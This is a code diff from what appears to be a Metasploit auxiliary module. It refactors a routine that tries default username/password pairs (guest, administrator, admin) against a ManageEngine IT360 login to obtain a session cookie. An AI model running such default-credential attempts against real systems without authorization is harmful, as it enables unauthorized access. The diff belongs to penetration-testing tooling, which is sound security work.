@@ -165,25 +165,14 @@ class Metasploit3 < Msf::Auxiliary
       end
     end
 
-    # Trying with the default guest password
-    print_status("#{peer} - Trying to authenticate as guest/guest...")
-    cookie = authenticate_it360(uri[0], uri[1], 'guest', 'guest')
-    unless cookie.nil?
-      return cookie
-    end
+    default_users = ['guest', 'administrator', 'admin']
 
-    # we've tried with the default guest password, now let's try with the default admin password
-    print_status("#{peer} - Trying to authenticate as administrator/administrator...")
-    cookie = authenticate_it360(uri[0], uri[1], 'administrator', 'administrator')
-    unless cookie.nil?
-      return cookie
-    end
-
-    # Try one more time with the default admin login for some versions
-    print_status("#{peer} - Trying to authenticate as admin/admin...")
-    cookie = authenticate_it360(uri[0], uri[1], 'admin', 'admin')
-    unless cookie.nil?
-      return cookie
+    default_users.each do |user|
+      print_status("#{peer} - Trying to authenticate as #{user}...")
+      cookie = authenticate_it360(uri[0], uri[1], user, user)
+      unless cookie.nil?
+        return cookie
+      end
     end
 
     nil
